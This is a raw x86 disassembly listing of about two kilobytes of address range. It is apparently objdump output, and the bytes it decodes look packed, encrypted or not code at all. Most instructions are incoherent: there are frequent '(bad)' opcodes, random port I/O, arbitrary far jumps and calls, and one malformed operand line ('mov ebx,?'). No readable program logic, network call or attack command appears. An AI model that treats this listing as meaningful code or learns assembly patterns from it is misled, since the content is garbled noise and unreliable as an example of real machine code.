  415544:	and    ch,0x4d
  415547:	mov    eax,ds:0x7b594ae0
  41554c:	jo     0x415560
  41554e:	pop    esi
  41554f:	mov    BYTE PTR [edx-0x4c],ah
  415552:	in     eax,0x9
  415554:	push   0xfffffffe
  415556:	lods   al,BYTE PTR ds:[esi]
  415557:	sub    DWORD PTR ds:0x8e867a9a,0xffffffa9
  41555e:	mov    edi,0x96cfeebe
  415563:	outs   dx,DWORD PTR ds:[esi]
  415564:	cmp    ah,dh
  415566:	xchg   esi,eax
  415567:	loopne 0x415578
  415569:	jmp    0x41559b
  41556b:	pop    ebp
  41556c:	sbb    eax,0xb015792
  415571:	lock fisub DWORD PTR [ecx-0x42e619a3]
  415578:	push   cs
  415579:	cmc    
  41557a:	int3   
  41557b:	mov    bh,0x8f
  41557d:	pop    ds
  41557e:	push   edx
  41557f:	data16 add dl,BYTE PTR [edi]
  415582:	js     0x415565
  415584:	call   0xb8c6:0x49c4ffb4
  41558b:	std    
  41558c:	sbb    ah,al
  41558e:	add    DWORD PTR [edi+0x4ccb2789],ecx
  415594:	xchg   edi,eax
  415595:	and    DWORD PTR [edx-0x48],ebp
  415598:	and    BYTE PTR fs:[ecx+0x2c],bh
  41559c:	fld    TBYTE PTR [eax-0x19]
  41559f:	addr16 ret 0x463b
  4155a3:	leave  
  4155a4:	add    DWORD PTR [edx],esp
  4155a6:	lds    esi,FWORD PTR [edx+edi*8]
  4155a9:	xchg   ebp,eax
  4155aa:	add    DWORD PTR [ecx],edi
  4155ac:	stc    
  4155ad:	inc    edx
  4155ae:	icebp  
  4155af:	jmp    0x45b8:0x13746f5b
  4155b6:	popf   
  4155b7:	or     DWORD PTR [ecx+0x1],0x60181e0e
  4155be:	mov    edi,0x411536f8
  4155c3:	xor    ebp,DWORD PTR [edi-0x5ff853d7]
  4155c9:	(bad)  
  4155ca:	pop    eax
  4155cb:	leave  
  4155cc:	ins    BYTE PTR es:[edi],dx
  4155cd:	mov    eax,ecx
  4155cf:	sub    BYTE PTR [ebx],al
  4155d1:	dec    esi
  4155d2:	sub    BYTE PTR ds:0xcf3c0b21,bl
  4155d8:	clc    
  4155d9:	xlat   BYTE PTR ds:[ebx]
  4155da:	cmp    DWORD PTR [ebx],edi
  4155dc:	cli    
  4155dd:	shl    DWORD PTR [esi+eiz*2+0x56],1
  4155e1:	or     bl,BYTE PTR [edx]
  4155e3:	fmul   DWORD PTR [edx]
  4155e5:	nop
  4155e6:	fcmovnb st,st(1)
  4155e8:	mov    ebp,0xa2d7ff0c
  4155ed:	pop    ds
  4155ee:	(bad)  
  4155ef:	aas    
  4155f0:	jns    0x4155e1
  4155f2:	mov    BYTE PTR [esi-0x57],ch
  4155f5:	aas    
  4155f6:	add    DWORD PTR [edi],ebx
  4155f8:	retf   
  4155f9:	adc    al,0xe1
  4155fb:	cmp    ebx,ebx
  4155fd:	cwde   
  4155fe:	cmp    esi,ebx
  415600:	inc    ebp
  415601:	outs   dx,DWORD PTR ds:[esi]
  415602:	sbb    eax,0x523f36e
  415607:	(bad)  
  415608:	mov    esp,DWORD PTR [ecx+ebp*1]
  41560b:	leave  
  41560c:	push   eax
  41560d:	push   cs
  41560e:	push   ebx
  41560f:	stc    
  415610:	and    dh,al
  415612:	mov    dl,0xdd
  415614:	jge    0x41565d
  415616:	out    dx,eax
  415617:	cmp    eax,0x6307e5e2
  41561c:	inc    ebp
  41561d:	das    
  41561e:	sbb    BYTE PTR [ecx],bl
  415620:	or     edx,DWORD PTR [ebx]
  415622:	mov    ds:0xad874af2,eax
  415627:	mov    cl,0xb3
  415629:	nop
  41562a:	pop    esi
  41562b:	sbb    esi,esp
  41562d:	loopne 0x415679
  41562f:	ret    0x7863
  415632:	inc    edi
  415633:	and    al,0xbc
  415635:	inc    edx
  415636:	lock cdq 
  415638:	mov    ah,BYTE PTR [eax+ebp*4]
  41563b:	xor    bl,dl
  41563d:	xor    al,0x60
  41563f:	(bad)  
  415640:	xor    DWORD PTR [ebx-0x7d],edi
  415643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415644:	mov    esi,0x3103e37b
  415649:	dec    ebx
  41564a:	sahf   
  41564b:	scas   eax,DWORD PTR es:[edi]
  41564c:	cli    
  41564d:	(bad)  
  41564e:	fisub  WORD PTR [edx]
  415650:	shl    DWORD PTR [edi+0x76],0xa0
  415654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415655:	add    ah,BYTE PTR [edi+0x20]
  415658:	mov    ecx,0x8b39eff4
  41565d:	fstp   TBYTE PTR [ecx-0x1e82a31a]
  415663:	or     dl,ah
  415665:	xchg   ecx,eax
  415666:	scas   eax,DWORD PTR es:[edi]
  415667:	xchg   esp,eax
  415668:	push   0xffffff86
  41566a:	ins    BYTE PTR es:[edi],dx
  41566b:	add    al,0x10
  41566d:	xchg   edi,eax
  41566e:	leave  
  41566f:	cmp    eax,0x4d069472
  415674:	push   cs
  415675:	fist   DWORD PTR [ebx+0x5c592b6d]
  41567b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41567c:	stos   DWORD PTR es:[edi],eax
  41567d:	adc    esi,eax
  41567f:	sbb    BYTE PTR [ecx],ah
  415681:	pop    ebp
  415682:	sbb    eax,0x5d539a4a
  415687:	or     bl,ch
  415689:	xor    al,0xd9
  41568b:	mov    ecx,0x20c5755b
  415690:	shr    DWORD PTR [eax-0x1aede8d8],1
  415696:	fild   DWORD PTR [ebx+edx*8]
  415699:	sbb    ebp,DWORD PTR [ecx]
  41569b:	inc    eax
  41569c:	and    ebx,DWORD PTR [ebp+0x2]
  41569f:	mov    al,bh
  4156a1:	jmp    0x3ca5:0xcf6d6cd9
  4156a8:	icebp  
  4156a9:	ins    DWORD PTR es:[edi],dx
  4156aa:	xchg   ebx,eax
  4156ab:	in     eax,dx
  4156ac:	push   edi
  4156ad:	or     DWORD PTR [ebp-0x30],ebx
  4156b0:	cmp    DWORD PTR [esi+0x2e],edx
  4156b3:	pop    ecx
  4156b4:	bsf    esi,DWORD PTR [ebp-0x76]
  4156b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156b9:	pop    edx
  4156ba:	xchg   ebx,eax
  4156bb:	jle    0x415676
  4156bd:	mov    esp,0x4aaae949
  4156c2:	lock adc eax,DWORD PTR [ebx]
  4156c5:	jbe    0x4156bc
  4156c7:	sbb    DWORD PTR [ebx],esi
  4156c9:	out    0xd1,al
  4156cb:	stos   DWORD PTR es:[edi],eax
  4156cc:	mov    ch,BYTE PTR [ecx-0x5e]
  4156cf:	test   eax,0x5910506d
  4156d4:	stc    
  4156d5:	repz dec eax
  4156d7:	mov    esp,0x961f9f3e
  4156dc:	mov    edx,0xbf761682
  4156e1:	aaa    
  4156e2:	mov    WORD PTR [edi-0xf288786],gs
  4156e8:	xchg   edx,eax
  4156e9:	out    0xe1,al
  4156eb:	je     0x4156e8
  4156ed:	pop    esi
  4156ee:	popa   
  4156ef:	aad    0xec
  4156f1:	adc    edx,ebx
  4156f3:	inc    esi
  4156f4:	xchg   eax,edi
  4156f6:	ss loope 0x415746
  4156f9:	mov    al,0xde
  4156fb:	jb     0x415685
  4156fd:	mov    ebx,?
  4156ff:	div    BYTE PTR [edi-0x75]
  415702:	sbb    DWORD PTR [eax-0x73218070],esi
  415708:	imul   esi,DWORD PTR [ecx],0x72fc58e2
  41570e:	jg     0x415698
  415710:	pop    ecx
  415711:	into   
  415712:	fisub  DWORD PTR [ecx]
  415714:	pop    ebx
  415715:	test   BYTE PTR [ecx],ch
  415717:	xor    DWORD PTR [ebp-0x3a987eda],ebp
  41571d:	call   0x30b6:0x48fb9965
  415724:	adc    eax,0xbbd9f3
  415729:	pusha  
  41572a:	jnp    0x415769
  41572c:	jmp    0x41571c
  41572e:	fs mov ebp,0x382d5a4a
  415734:	push   es
  415735:	inc    esi
  415736:	or     BYTE PTR [esi+ebp*8],bh
  415739:	jae    0x415732
  41573b:	push   esp
  41573c:	mov    edx,0x372bd8c8
  415741:	push   0x0
  415743:	out    dx,al
  415744:	inc    ebp
  415745:	jnp    0x415702
  415747:	mov    bh,BYTE PTR [edi+0x3fa87118]
  41574d:	sub    eax,0x4433769f
  415752:	jbe    0x41574c
  415754:	lock outs dx,DWORD PTR ds:[esi]
  415756:	cmp    ah,BYTE PTR [ebp+eiz*4+0x34]
  41575a:	xor    eax,0x9163f81f
  41575f:	std    
  415760:	lock adc edi,DWORD PTR [esi+ebp*2]
  415764:	lods   al,BYTE PTR fs:[esi]
  415766:	adc    BYTE PTR [edx+0x7e6dc0b7],0x5d
  41576d:	cmp    eax,0x34f7201
  415772:	sbb    eax,0x1dca168c
  415777:	mov    ch,0xb
  415779:	and    al,0x7a
  41577b:	sbb    eax,0x91dac476
  415780:	loope  0x4157cc
  415782:	cli    
  415783:	retf   
  415784:	pushf  
  415785:	mov    bh,0x8
  415787:	call   FWORD PTR [edi+0x8ee73bc]
  41578d:	jnp    0x4157dc
  41578f:	inc    eax
  415790:	stos   BYTE PTR es:[edi],al
  415791:	mov    esp,0xe713a122
  415796:	fild   DWORD PTR [esi-0x3564a6b7]
  41579c:	fmul   DWORD PTR [edx+0x68d9c8f2]
  4157a2:	mov    cl,0xd1
  4157a4:	out    0x62,eax
  4157a6:	jne    0x4157f9
  4157a8:	mov    BYTE PTR [ecx-0x2e],0xcc
  4157ac:	cwde   
  4157ad:	(bad)  
  4157ae:	sbb    BYTE PTR [edi-0x71],dl
  4157b1:	inc    edx
  4157b2:	enter  0xcd97,0x94
  4157b6:	scas   eax,DWORD PTR es:[edi]
  4157b7:	mov    ds:0xfd0f9c8c,al
  4157bc:	pop    ds
  4157bd:	and    ebp,DWORD PTR [edi]
  4157bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157c0:	or     DWORD PTR [esi],ecx
  4157c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157c3:	mov    cl,0x41
  4157c5:	stos   DWORD PTR es:[edi],eax
  4157c6:	bound  ecx,QWORD PTR [edi+eax*8]
  4157c9:	das    
  4157ca:	sbb    BYTE PTR [ebx-0x3174a1de],cl
  4157d0:	cmp    al,0x96
  4157d2:	out    0xdf,eax
  4157d4:	and    esp,ecx
  4157d6:	mov    bh,0xf
  4157d8:	xor    al,0x37
  4157da:	retf   
  4157db:	call   FWORD PTR [esp+eiz*4-0x39]
  4157df:	nop
  4157e0:	sbb    eax,0x5867cb7c
  4157e5:	mov    BYTE PTR [ebx],al
  4157e7:	sbb    ch,dh
  4157e9:	xchg   edi,eax
  4157ea:	xchg   eax,ebx
  4157ec:	mov    ebx,0x2b248d5
  4157f1:	(bad)  
  4157f3:	mov    ecx,0x2a26edca
  4157f8:	mov    DWORD PTR [edi+eiz*8-0x2fa6e93c],esp
  4157ff:	push   esp
  415800:	retf   0xbe22
  415803:	outs   dx,DWORD PTR ds:[esi]
  415804:	in     al,dx
  415805:	pop    esi
  415806:	cwde   
  415807:	mov    ebp,0xa9d7a6
  41580c:	push   ss
  41580d:	mov    ch,0xe1
  41580f:	stos   DWORD PTR es:[edi],eax
  415810:	rcl    ebp,0x91
  415813:	inc    edx
  415814:	jmp    0xb849:0xe708d5ad
  41581b:	sub    DWORD PTR fs:[edx+0x39],esp
  41581f:	dec    esi
  415820:	pop    ds
  415821:	(bad)
  415824:	loop   0x415830
  415826:	push   esi
  415827:	push   edx
  415828:	jge    0x415837
  41582a:	jae    0x4157d9
  41582c:	mov    ecx,DWORD PTR [eax+0x3303295b]
  415832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415833:	fmul   QWORD PTR [ebx]
  415835:	add    eax,edi
  415837:	int3   
  415838:	jbe    0x41581c
  41583a:	cdq    
  41583b:	test   BYTE PTR [ebp+eax*8+0x33],cl
  41583f:	cdq    
  415840:	cmp    al,0x1a
  415842:	cwde   
  415843:	iret   
  415844:	test   DWORD PTR [ebp-0xb],0x7d3ad238
  41584b:	(bad)  
  41584c:	push   ds
  41584d:	call   DWORD PTR [edx-0x5dade59]
  415853:	or     eax,0x1101948a
  415858:	pop    es
  415859:	clc    
  41585a:	adc    DWORD PTR [edi-0x5a],edi
  41585d:	std    
  41585e:	fwait
  41585f:	and    al,0xaa
  415861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415862:	adc    BYTE PTR [ebx+0x70],ah
  415865:	sbb    dl,BYTE PTR [ebp+0x69477186]
  41586b:	retf   0x2830
  41586e:	cmp    eax,0xb7e5d21
  415873:	icebp  
  415874:	test   al,0x21
  415876:	adc    eax,0xcd989e3a
  41587b:	fiadd  DWORD PTR [esi-0x52]
  41587e:	mov    ah,0x3f
  415880:	cmp    eax,0xbb7986e7
  415885:	(bad)  
  415886:	call   DWORD PTR [ebx+ebp*4]
  415889:	sahf   
  41588a:	les    eax,FWORD PTR [ecx+0x41]
  41588d:	lods   eax,DWORD PTR ds:[esi]
  41588e:	repz jl 0x41582a
  415891:	ins    BYTE PTR es:[edi],dx
  415892:	mov    al,0xd2
  415894:	fucomip st,st(6)
  415896:	pop    eax
  415897:	sub    edi,ebp
  415899:	lea    di,[edi-0x5dedb84f]
  4158a0:	sbb    eax,0x93ad046e
  4158a5:	sbb    BYTE PTR [esi-0x1c],0x97
  4158a9:	scas   eax,DWORD PTR es:[edi]
  4158aa:	stos   DWORD PTR es:[edi],eax
  4158ab:	call   DWORD PTR [ecx+ebx*8-0xb]
  4158af:	or     DWORD PTR [edi],edi
  4158b1:	mov    dh,0x7c
  4158b3:	jnp    0x41584b
  4158b5:	out    0x1b,eax
  4158b7:	mov    dh,0x28
  4158ba:	mov    ds:0xe4669f95,eax
  4158bf:	sub    DWORD PTR [eax-0x63531e06],0x13
  4158c6:	sbb    al,0x89
  4158c8:	xchg   ecx,eax
  4158c9:	jb     0x4158b1
  4158cb:	xor    eax,0xa86d601b
  4158d0:	outs   dx,BYTE PTR ds:[esi]
  4158d1:	push   ebx
  4158d2:	out    dx,eax
  4158d3:	rcr    BYTE PTR [ebx],cl
  4158d5:	btc    DWORD PTR [ecx+0x5853954f],edx
  4158dc:	inc    esp
  4158dd:	mov    bh,0xa6
  4158df:	data16 adc BYTE PTR [ecx],0x9e
  4158e3:	fist   DWORD PTR [edx+0x2f230df7]
  4158e9:	xchg   edi,eax
  4158ea:	sub    eax,0xe5153510
  4158ef:	ss xchg ebx,eax
  4158f1:	push   0xffffffb8
  4158f3:	push   esp
  4158f4:	adc    al,BYTE PTR [ecx]
  4158f6:	out    dx,eax
  4158f7:	or     esp,DWORD PTR [eax+0x3a]
  4158fa:	(bad)  
  4158fb:	cmc    
  4158fc:	(bad)  
  4158fd:	and    eax,0xaf0af254
  415902:	inc    ebx
  415903:	sub    ah,BYTE PTR [ecx]
  415905:	xor    eax,0x473ccbf4
  41590a:	pop    es
  41590b:	mov    ds:0xaee46b9f,al
  415910:	dec    ecx
  415911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415912:	test   eax,0xa64e763c
  415917:	mov    al,0x9e
  415919:	in     al,dx
  41591a:	or     eax,0xe8b91da9
  41591f:	stc    
  415920:	mov    ecx,0xefb642bd
  415925:	repz into 
  415927:	lahf   
  415928:	push   esi
  415929:	mov    ds:0xf05ad8fb,al
  41592e:	cwde   
  41592f:	adc    BYTE PTR [eax+ebx*8],dl
  415932:	or     DWORD PTR [edi-0x7a],esp
  415935:	call   0xaaee10c1
  41593a:	xor    BYTE PTR [edi-0x4f],al
  41593d:	sub    BYTE PTR [edx-0x5aef4da],dl
  415943:	out    0x90,al
  415945:	pop    edx
  415946:	lods   eax,DWORD PTR ds:[esi]
  415947:	push   ecx
  415948:	or     DWORD PTR cs:[edx-0x60],ebp
  41594c:	cmc    
  41594d:	xor    dh,BYTE PTR [ecx-0x72]
  415950:	xlat   BYTE PTR ds:[ebx]
  415951:	push   esi
  415952:	push   0x78
  415954:	loope  0x4158e7
  415956:	aas    
  415957:	cs mov cl,0x16
  41595a:	idiv   DWORD PTR [edx]
  41595c:	push   edi
  41595d:	mov    eax,ds:0x5e20d02d
  415962:	cmp    al,0xab
  415964:	aaa    
  415965:	out    0x1a,eax
  415967:	dec    edx
  415968:	enter  0x5d24,0x22
  41596c:	mov    al,ds:0x2385b8d4
  415971:	ret    
  415972:	in     eax,dx
  415973:	in     al,0x76
  415975:	imul   ecx,DWORD PTR [edx+0x44],0xabc83c8
  41597c:	adc    eax,0x57307b50
  415981:	int    0xa5
  415983:	push   edi
  415984:	fistp  QWORD PTR [edi+eiz*4+0x6bd3646e]
  41598b:	ins    BYTE PTR es:[edi],dx
  41598c:	mov    ds:0x381a1f17,eax
  415991:	in     eax,dx
  415992:	xor    BYTE PTR [ebx-0x55240d9c],bh
  415998:	mov    ebx,0x8b38133d
  41599d:	aas    
  41599e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41599f:	sub    bh,BYTE PTR [esi+edx*2+0x11]
  4159a3:	adc    esi,DWORD PTR [edi-0x21]
  4159a6:	cli    
  4159a7:	fcmovnbe st,st(2)
  4159a9:	rcr    DWORD PTR [bx+si+0xfc3],cl
  4159ae:	adc    DWORD PTR [ecx],esp
  4159b0:	aam    0xec
  4159b2:	fidivr DWORD PTR [edx-0x19]
  4159b5:	hlt    
  4159b6:	jge    0x4159c5
  4159b8:	xor    ecx,DWORD PTR ds:0x3aec9153
  4159be:	dec    esp
  4159bf:	mov    esi,0x468e6f96
  4159c4:	push   ecx
  4159c5:	dec    ebx
  4159c6:	clc    
  4159c7:	arpl   sp,bx
  4159c9:	jmp    0x6867:0x2e42bf5
  4159d0:	lods   eax,DWORD PTR ds:[esi]
  4159d1:	inc    ecx
  4159d2:	xor    al,0xb9
  4159d4:	clc    
  4159d5:	outs   dx,DWORD PTR ds:[esi]
  4159d6:	loop   0x4159ac
  4159d8:	mov    bh,0x93
  4159da:	or     al,0xfa
  4159dc:	test   eax,0x49927d99
  4159e1:	xchg   ebx,edi
  4159e3:	or     eax,0x280ad8fe
  4159e8:	inc    esi
  4159e9:	loopne 0x415a2f
  4159eb:	mov    ah,0x58
  4159ed:	dec    ecx
  4159ee:	inc    esp
  4159ef:	les    ebp,FWORD PTR [ebp-0x2419c0d3]
  4159f5:	mov    eax,0xf5b78926
  4159fa:	retf   0xb7e4
  4159fd:	dec    esp
  4159fe:	std    
  4159ff:	lahf   
  415a00:	dec    edi
  415a01:	push   es
  415a02:	mov    esi,0xd068a614
  415a07:	xor    BYTE PTR [edi+0x45],dl
  415a0a:	pop    ebp
  415a0b:	pushf  
  415a0c:	movntps XMMWORD PTR [ebp+0x49],xmm2
  415a10:	mov    cl,0xaf
  415a12:	fmul   QWORD PTR ds:0xb4bd01e5
  415a18:	and    edx,DWORD PTR [ecx+ecx*1+0x4a]
  415a1c:	pop    es
  415a1d:	cmp    eax,0x785285a3
  415a22:	lock mov ecx,0xca0ef58a
  415a28:	lods   eax,DWORD PTR ds:[esi]
  415a29:	sub    eax,DWORD PTR [eax-0x65]
  415a2c:	sbb    eax,0x8236d7ec
  415a31:	adc    cl,0xde
  415a34:	adc    eax,0xc4382f0c
  415a39:	scas   eax,DWORD PTR es:[edi]
  415a3a:	pop    ebx
  415a3b:	pop    eax
  415a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a3d:	pop    es
  415a3e:	loope  0x415a48
  415a40:	out    0x29,al
  415a42:	pop    ebx
  415a43:	xor    eax,0x87590fcd
  415a48:	jns    0x415abf
  415a4a:	pushf  
  415a4b:	mov    bh,0xa1
  415a4d:	cmp    al,0x75
  415a4f:	pusha  
  415a50:	xor    al,0x19
  415a52:	xchg   ebx,eax
  415a53:	xchg   edi,eax
  415a54:	aad    0x8b
  415a56:	aaa    
  415a57:	call   0xc502:0x78f1b42b
  415a5e:	das    
  415a5f:	hlt    
  415a60:	fldenv [ebx-0x6bb85cc2]
  415a66:	push   ebp
  415a67:	sar    ch,0xa1
  415a6a:	sub    cl,BYTE PTR [ecx-0xb]
  415a6d:	pop    ebx
  415a6e:	outs   dx,BYTE PTR ds:[esi]
  415a6f:	call   0x3454:0x2c32cfe6
  415a76:	stos   DWORD PTR es:[edi],eax
  415a77:	dec    edx
  415a78:	mov    DWORD PTR ds:0xfb6977d,esi
  415a7e:	ja     0x415aa9
  415a80:	lea    ebx,[edi]
  415a82:	jmp    0x1735d6a9
  415a87:	nop
  415a88:	dec    edx
  415a89:	test   eax,ebx
  415a8b:	jb     0x415a58
  415a8d:	sub    edi,DWORD PTR [ecx-0x1c1f677f]
  415a93:	loop   0x415b02
  415a95:	xor    BYTE PTR [edx],ah
  415a97:	dec    ebx
  415a98:	push   esp
  415a99:	into   
  415a9a:	js     0x415aac
  415a9c:	aad    0x43
  415a9e:	pop    esp
  415a9f:	dec    esp
  415aa0:	cmp    BYTE PTR [ecx],bh
  415aa2:	fmul   st(3),st
  415aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aa5:	inc    esi
  415aa6:	add    DWORD PTR [esi-0x73],edx
  415aa9:	out    0x95,eax
  415aab:	dec    edx
  415aac:	repz out 0xa6,al
  415aaf:	fimul  WORD PTR [esi+0x353a7fc6]
  415ab5:	xor    BYTE PTR [eax+ecx*1],0x5d
  415ab9:	test   al,0xc7
  415abb:	xchg   ah,bh
  415abd:	and    ebp,ecx
  415abf:	push   esp
  415ac0:	sub    al,BYTE PTR [eax]
  415ac2:	into   
  415ac3:	sub    esp,edx
  415ac5:	or     bh,dl
  415ac7:	or     eax,DWORD PTR [ebp+0x56]
  415aca:	mov    ecx,0x80ae6189
  415acf:	inc    esi
  415ad0:	sub    BYTE PTR ds:0xfc05bcdd,cl
  415ad6:	jg     0x415a5e
  415ad8:	pop    esp
  415ad9:	mov    ch,0x3e
  415adb:	iret   
  415adc:	into   
  415add:	or     edx,DWORD PTR ds:0xbc9640c4
  415ae3:	sub    al,0x8d
  415ae5:	mov    ds:0xdeed0f59,al
  415aea:	fstp   QWORD PTR [ecx]
  415aec:	xor    eax,0x594249c4
  415af1:	dec    ecx
  415af2:	scas   eax,DWORD PTR es:[edi]
  415af3:	or     BYTE PTR [ebx-0x1d],cl
  415af6:	mov    edx,0x703cf71d
  415afb:	sti    
  415afc:	aas    
  415afd:	or     BYTE PTR [ebp-0x11],bl
  415b00:	adc    ch,BYTE PTR [ebx]
  415b02:	addr16 xchg ebx,eax
  415b04:	push   ecx
  415b05:	aam    0x4a
  415b07:	sbb    DWORD PTR ds:0x5a0807d8,ecx
  415b0d:	add    BYTE PTR [edi-0x2],ah
  415b10:	mov    bl,0xe1
  415b12:	adc    al,0x74
  415b14:	ds inc ebp
  415b16:	sub    edx,edi
  415b18:	inc    ecx
  415b19:	xor    DWORD PTR [edx+0x4a],0x8035b16e
  415b20:	jb     0x415b86
  415b22:	xchg   edi,eax
  415b23:	sub    dl,BYTE PTR [esi-0x1d]
  415b26:	lahf   
  415b27:	mov    edi,0xeca286a8
  415b2c:	sub    DWORD PTR ds:0xa612a1e3,edi
  415b32:	aam    0x4f
  415b34:	aad    0xf
  415b36:	data16 sahf 
  415b38:	mov    ebp,0xeceb635c
  415b3d:	and    DWORD PTR ds:0xb3fb1d63,esp
  415b43:	cmp    DWORD PTR [esi+ecx*4-0x7e],0xffffff82
  415b48:	adc    eax,0x70aa1407
  415b4d:	not    BYTE PTR [ebx-0xed96bf1]
  415b53:	jb     0x415b54
  415b55:	test   edi,0xe0acdb71
  415b5b:	pop    edx
  415b5c:	add    al,BYTE PTR [ebx+0x6a838f5e]
  415b62:	or     eax,0xc809a955
  415b67:	icebp  
  415b68:	das    
  415b69:	dec    ebp
  415b6a:	ficom  DWORD PTR [edx+0xd]
  415b6d:	in     eax,dx
  415b6e:	(bad)
  415b71:	les    esi,FWORD PTR [edx+0x5]
  415b74:	jmp    0x2bb3:0x439cd4ae
  415b7b:	gs mov ah,0xa2
  415b7e:	lods   al,BYTE PTR ds:[esi]
  415b7f:	in     eax,dx
  415b80:	dec    ebx
  415b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b82:	not    DWORD PTR [edx+edx*4-0x5fcbd29a]
  415b89:	mov    edi,0xcc00370a
  415b8e:	addr16 jbe 0x415c0c
  415b91:	call   0xa0b6:0xa61a404
  415b98:	in     al,0x5f
  415b9a:	icebp  
  415b9b:	sar    cl,0xa9
  415b9e:	sub    BYTE PTR [edx],0x5b
  415ba1:	es test eax,0x15785f82
  415ba7:	(bad)  
  415ba8:	and    DWORD PTR ds:[esp+esi*2-0x40],ebx
  415bad:	fidivr WORD PTR [eax+0x0]
  415bb0:	xor    al,BYTE PTR [ebx]
  415bb2:	sub    BYTE PTR [ebx-0x5e],dl
  415bb5:	jno    0x415bb7
  415bb7:	in     eax,dx
  415bb8:	fistp  QWORD PTR [esi]
  415bba:	mov    edi,0xfa318810
  415bbf:	leave  
  415bc0:	std    
  415bc1:	push   ecx
  415bc2:	fstp   st(1)
  415bc4:	pop    ss
  415bc5:	adc    al,0xd0
  415bc7:	xchg   edx,eax
  415bc8:	cdq    
  415bc9:	mov    ah,0xd
  415bcb:	stc    
  415bcc:	fistp  DWORD PTR [edi+0x25]
  415bcf:	imul   esi,edi,0x67
  415bd2:	sti    
  415bd3:	cmp    DWORD PTR [ecx+0x70a28802],ebp
  415bd9:	jbe    0x415bc4
  415bdb:	test   al,0xa7
  415bdd:	and    edi,ebp
  415bdf:	dec    esi
  415be0:	loope  0x415c09
  415be2:	push   ds
  415be3:	sti    
  415be4:	pop    ebp
  415be5:	mov    DWORD PTR [eax+0x5bda5d18],edi
  415beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bec:	int3   
  415bed:	jg     0x415b98
  415bef:	push   ecx
  415bf0:	sbb    al,0x32
  415bf2:	in     al,0xd4
  415bf4:	ret    0xa925
  415bf7:	popa   
  415bf8:	mov    ch,0x77
  415bfa:	pop    es
  415bfb:	jns    0x415c15
  415bfd:	and    eax,0xc2626fd3
  415c02:	sub    bl,BYTE PTR [edi+0x2b]
  415c05:	jmp    0x415c3a
  415c07:	enter  0xc1e4,0xc6
  415c0b:	push   ds
  415c0c:	aad    0x7
  415c0e:	sbb    ecx,DWORD PTR [ecx]
  415c10:	push   es
  415c11:	(bad)  
  415c12:	jb     0x415bad
  415c14:	mov    edi,0x7a3a7799
  415c19:	(bad)  
  415c1a:	or     bh,BYTE PTR [ebp-0x35345b68]
  415c20:	sub    ecx,DWORD PTR [eax]
  415c22:	cli    
  415c23:	rcr    DWORD PTR [eax],cl
  415c25:	jmp    0x81ad:0x2aef3b8e
  415c2c:	add    DWORD PTR [edi],ecx
  415c2e:	cwde   
  415c2f:	and    al,0x60
  415c31:	mov    ecx,0x5d0fef38
  415c36:	das    
  415c37:	inc    edi
  415c38:	xchg   esp,eax
  415c39:	mov    BYTE PTR [eax],ah
  415c3b:	sahf   
  415c3c:	or     edi,eax
  415c3e:	jle    0x415c3d
  415c40:	inc    ebx
  415c41:	mov    dh,0x56
  415c43:	sbb    eax,0x6a41fade
  415c48:	fwait
  415c49:	xor    eax,0x1e041ea3
  415c4e:	push   0x3dc48ca0
  415c53:	mov    ch,bh
  415c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c56:	dec    edx
  415c57:	fild   WORD PTR [edi]
  415c59:	mov    ah,0x16
  415c5b:	lea    edi,[eax+0x65d3ce5f]
  415c61:	jp     0x415cb0
  415c63:	loopne 0x415c01
  415c65:	fmul   QWORD PTR [eax+0x6ba1ecaf]
  415c6b:	jp     0x415cd3
  415c6d:	lds    ebx,FWORD PTR [esi+0x66]
  415c70:	and    dh,BYTE PTR [edx-0x4045a8ee]
  415c76:	(bad)
  415c7a:	xor    edi,ecx
  415c7c:	aas    
  415c7d:	xor    al,0x19
  415c7f:	add    esp,DWORD PTR [edi-0x1a52afb2]
  415c85:	sub    cl,BYTE PTR [esi-0x1efc5eed]
  415c8b:	scas   al,BYTE PTR es:[edi]
  415c8c:	aas    
  415c8d:	sbb    ecx,DWORD PTR [esi+0x1abe13ca]
  415c93:	xor    al,BYTE PTR [ebp+0x1db71a87]
  415c99:	hlt    
  415c9a:	mov    ecx,0xd6392a5c
  415c9f:	jnp    0x415c56
  415ca1:	retf   0x9aac
  415ca4:	fmul   QWORD PTR [ecx]
  415ca6:	cmp    eax,0xf61c3dde
  415cab:	test   eax,0x4a038b6c
  415cb0:	jno    0x415d0f
  415cb2:	outs   dx,BYTE PTR ds:[esi]
  415cb4:	sub    BYTE PTR [esi+0xa0d9aa9],0x7
  415cbb:	xchg   edi,eax
  415cbc:	mov    edi,0xb14cffee
  415cc1:	dec    eax
  415cc2:	fisttp QWORD PTR fs:[ebx]
  415cc5:	sbb    edx,DWORD PTR [esi-0x6fe48c08]
  415ccb:	cld    
  415ccc:	scas   eax,DWORD PTR es:[edi]
  415ccd:	mov    ds:0x726d4f38,al
  415cd2:	lods   al,BYTE PTR ds:[esi]
  415cd3:	sub    BYTE PTR [eax],dh
  415cd5:	add    dl,0x13
  415cd8:	xchg   edi,eax
  415cd9:	dec    edi
  415cda:	lods   eax,DWORD PTR ds:[esi]
  415cdb:	adc    eax,0xc1cb3b7c
  415ce0:	cmp    ecx,DWORD PTR [esi-0x28b10e7c]
  415ce6:	push   ebp
  415ce7:	fnstenv [ebp-0x54]
  415cea:	ficomp DWORD PTR [esi+0x1f]
  415ced:	fstp   QWORD PTR [edi+0x72e48bbe]
  415cf3:	or     al,0xbb
  415cf5:	jl     0x415cb5
  415cf7:	ds lahf 
  415cf9:	cmp    eax,DWORD PTR [edx+0x3b07d3c0]
  415cff:	(bad)  
  415d00:	enter  0x4dd,0x9d
  415d04:	inc    ecx
